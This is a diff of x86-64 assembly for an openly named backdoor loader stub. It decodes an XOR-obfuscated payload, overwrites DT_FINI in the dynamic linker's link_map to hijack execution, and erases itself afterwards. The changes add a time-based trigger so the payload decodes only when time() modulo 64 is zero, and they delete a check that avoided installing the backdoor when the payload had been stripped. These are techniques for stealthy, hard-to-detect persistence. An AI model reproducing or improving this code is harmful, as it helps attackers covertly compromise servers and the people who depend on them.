@@ -14,7 +14,6 @@ _begin:
 
     // Make sure argv[0] starts with '/' (which is unusual when debugging, but plausible with xinetd)
     mov rcx, [rdi]
-    movabs r10, ADDR_TO_WRITE
     jrcxz bye
     cmp byte ptr [rcx], '/'
     jnz bye
@@ -42,29 +41,27 @@ env_check_loop:
     jmp env_check_loop
 
 env_check_okay:
-    // Decode payload
-    movqq rcx, (PAYLOAD_SIZE_IN_WORDS+1)
     // lea rdi, [rbx+(_end-_begin)+8]
     .byte 0x48, 0x8d, 0x7b, (_end-_begin)+8
+    /* Patch payload to only run at correct time. */
+    call [rbx-8]
+    /* Decode payload only when time() % 64 == 0 */
+    test al, 63
+    movabs r11, VALUE_TO_WRITE
+    jnz bye
+    // Decode payload
+    push (PAYLOAD_SIZE_IN_WORDS+1)
     xor eax, eax
+    movabs r10, ADDR_TO_WRITE
+    pop rcx
 decode_loop:
     xor [rdi+rcx*4], eax
-    // If the payload is somehow zeroed (for example, stripped or loaded by WSL 1),
-    // we should not install the backdoor.
-    // This could be done in two bytes (!) by exiting immediately if decoded
-    // dword is zero: our obfuscation decodes all zero to all zero, and we
-    // check that there are no aligned zero dword in inject_backdoor.py
-    jz bye
-    nop
-    movabs r11, VALUE_TO_WRITE
     add eax, [rdi+rcx*4]
     loop decode_loop
 
     // Overwrite dl_info[DT_FINI] in link_map
     mov [r10], r11
 
-    // Patch payload to only run at correct time.
-    call [rbx-8]
 bye:
     // Zeroing self
     movqq rdi, rbx
